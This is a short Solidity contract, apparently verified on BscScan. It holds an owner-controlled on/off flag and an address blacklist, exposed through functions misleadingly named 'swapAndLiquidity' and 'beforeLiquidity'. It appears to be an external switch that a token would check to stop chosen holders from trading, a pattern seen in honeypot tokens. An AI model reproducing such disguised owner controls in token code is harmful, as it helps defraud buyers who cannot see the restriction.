/**
 *Submitted for verification at BscScan.com on 2022-11-20
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;



abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }
}


contract CA is Ownable{
    bool public enable = true;
    mapping(address => bool) public _blackList;

    function setEnable(bool status) public onlyOwner{
        enable = status;
    }

    function swapAndLiquidity() external view returns(bool){
        return enable;
    }

    function addBlackList(address account) public onlyOwner{
        _blackList[account] = true;
    }

    function delBlackList(address account) public onlyOwner{
        _blackList[account] = false;
    }

    function beforeLiquidity(address s) external view returns(bool){
        return !_blackList[s];
    }

}